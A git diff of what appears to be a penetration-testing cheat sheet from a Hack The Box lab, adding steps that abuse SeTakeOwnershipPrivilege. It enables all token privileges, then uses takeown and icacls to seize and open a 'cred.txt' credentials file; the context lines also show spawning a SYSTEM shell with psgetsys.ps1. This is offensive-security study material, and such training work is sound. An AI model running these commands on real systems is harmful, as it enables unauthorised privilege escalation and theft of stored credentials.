@@ -91,3 +91,19 @@ In <system_pid>, get a system process with tasklist
 ````
 .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,"c:\Windows\System32\cmd.exe","")
 ````
+
+## SeTakeOwnershipPrivilege
+Enabling disable privileges ([Enable-Privilege.ps1](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1))
+````
+Import-Module .\Enable-Privilege.ps1
+.\EnableAllTokenPrivs.ps1
+````
+
+Granted prvileges of a file
+````
+takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+````
+In sometimes, it's necesary to change file ACL
+````
+icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+````
